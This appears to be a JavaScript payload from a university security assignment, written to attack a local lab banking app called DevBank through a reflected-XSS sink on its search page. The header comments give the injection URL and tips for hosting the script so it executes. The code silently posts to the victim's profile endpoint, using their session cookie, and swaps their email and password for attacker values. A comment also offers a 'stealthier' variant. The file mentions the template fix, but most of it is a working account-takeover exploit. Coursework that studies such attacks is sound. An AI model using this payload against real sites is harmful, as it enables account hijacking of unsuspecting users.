// FIT5003 A2 - Part B.2: externally-hosted reflected-XSS payload.
//
// Delivery: injected into DevBank via the reflected sink at /search?q=...
//   http://127.0.0.1:5000/search?q=<script src="https://cdn.jsdelivr.net/gh/<YOU>/<REPO>@main/payload.js"></script>
//
// A raw GitHub URL is served as text/plain with nosniff and will NOT execute.
// Host this on GitHub Pages, or load it through jsDelivr (correct JS content-type).
//
// When a logged-in victim opens the crafted URL, this script runs in the DevBank
// origin with the victim's session cookie and silently takes over their account by
// changing their email + password through the profile feature (/profile accepts a
// form POST with `email` and `password`). This demonstrates account takeover.
//
// NOTE: After you add HttpOnly to the cookie (Part D) this script still works,
// because it does not need to READ the cookie - the browser attaches it
// automatically to the same-origin POST. Your actual B.2 FIX is removing the
// `| safe` filter in search.html so the <script> tag is never parsed at all.

(function () {
  var ATTACKER_EMAIL = "attacker@evil.example";
  var ATTACKER_PASSWORD = "pwned-by-attacker";

  var body = "email=" + encodeURIComponent(ATTACKER_EMAIL) +
             "&password=" + encodeURIComponent(ATTACKER_PASSWORD);

  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",        // send the victim's DevBank session cookie
    body: body
  }).then(function () {
    // Visible proof the payload fired (optional - remove for a stealthier demo).
    console.log("[payload] profile updated: email/password changed");
  });
})();
